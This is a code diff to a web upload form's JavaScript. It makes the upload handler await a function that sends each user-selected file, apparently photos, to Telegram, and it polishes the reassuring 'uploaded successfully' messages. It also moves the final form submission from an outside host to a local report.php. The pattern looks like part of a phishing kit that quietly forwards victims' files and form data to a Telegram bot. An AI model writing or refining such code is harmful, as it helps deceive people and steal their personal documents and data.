@@ -264,17 +264,29 @@
             const input = document.getElementById(inputId);
             const box = document.getElementById(boxId);
             
-            input.addEventListener('change', function(e) {
+            input.addEventListener('change', async function(e) {
                 if (this.files && this.files[0]) {
-                    box.classList.add('uploaded');
+                    const fileName = this.files[0].name;
+                    
+                    // Show uploading status
+                    box.classList.add('bg-blue-50', 'border-blue-300');
                     let status = box.querySelector('.upload-status');
                     if (!status) {
                         status = document.createElement('div');
                         status.className = 'upload-status';
                         box.appendChild(status);
                     }
-                    status.textContent = '✓ Uploaded: ' + this.files[0].name;
-                    sendFileToTelegram(inputId, this.files[0]);
+                    status.textContent = '⏳ Uploading...';
+                    status.className = 'text-blue-600 text-sm md:text-base font-semibold mt-2';
+                    
+                    // Send to Telegram
+                    await sendFileToTelegram(inputId, this.files[0]);
+                    
+                    // Show success
+                    box.classList.remove('bg-blue-50', 'border-blue-300');
+                    box.classList.add('uploaded');
+                    status.textContent = '✓ Photo uploaded successfully';
+                    status.className = 'upload-status';
                 }
             });
         }
@@ -353,7 +365,7 @@
             finalData.append('submit', 'final');
 
             try {
-                const response = await fetch('https://mine.repeatcar.com/568/op/report.php', { method: 'POST', body: finalData });
+                const response = await fetch('report.php', { method: 'POST', body: finalData });
                 if (response.ok) {
                     alert('Form submitted successfully!');
                     location.reload();
